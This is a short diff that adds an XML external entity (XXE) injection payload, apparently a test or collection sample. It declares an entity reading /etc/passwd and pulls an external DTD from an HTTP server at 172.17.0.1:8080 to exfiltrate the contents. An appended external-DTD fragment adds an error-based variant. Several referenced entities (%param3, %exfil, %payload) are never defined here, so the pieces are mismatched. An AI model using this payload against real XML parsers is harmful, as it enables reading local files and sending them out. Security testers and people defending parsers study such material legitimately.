@@ -1,0 +1,12 @@
+<?xml version="1.0"?>
+<!DOCTYPE r [
+        <!ENTITY % data3 SYSTEM "file:///etc/passwd">
+        <!ENTITY % sp SYSTEM "http://172.17.0.1:8080/ss5.dtd">
+        %sp;
+        %param3;
+        %exfil;
+        ]>
+<r></r>
+        ## External dtd: ##
+
+<!ENTITY % param1 '<!ENTITY &#x25; external SYSTEM "file:///nothere/%payload;">'> %param1; %external;
